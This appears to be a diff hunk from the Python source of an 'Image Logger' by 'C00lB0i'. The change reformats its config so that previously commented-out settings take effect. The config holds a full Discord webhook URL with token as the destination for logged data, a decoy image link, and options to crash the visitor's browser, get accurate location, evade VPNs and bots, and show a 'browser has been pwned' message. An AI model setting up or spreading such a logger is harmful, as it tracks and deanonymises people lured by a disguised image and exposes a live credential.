@@ -17,13 +17,17 @@ __version__ ="v2.1"
 __author__ ="C00lB0i"
 
 config = {
-    # BASE CONFIG #"webhook":"https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz","image":"https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg","imageArgument": True,
+    # BASE CONFIG 
+    "webhook":"https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz","image":"https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg","imageArgument": True,
 
-    # CUSTOMIZATION #"username":"Image Logger","color": 0x00FFFF,
+    # CUSTOMIZATION 
+    "username":"Image Logger","color": 0x00FFFF,
 
-    # OPTIONS #"crashBrowser": False,"accurateLocation": False,"message": {"doMessage": False,"message":"This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC","richMessage": True,},"vpnCheck": 1,"linkAlerts": True,"buggedImage": True,"antiBot": 1,
+    # OPTIONS 
+    "crashBrowser": False,"accurateLocation": False,"message": {"doMessage": False,"message":"This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC","richMessage": True,},"vpnCheck": 1,"linkAlerts": True,"buggedImage": True,"antiBot": 1,
 
-    # REDIRECTION #"redirect": {"redirect": False,"page":"https://your-link.here"
+    # REDIRECTION 
+    "redirect": {"redirect": False,"page":"https://your-link.here"
     },}
 blacklistedIPs = ("27","104","143","164")
 
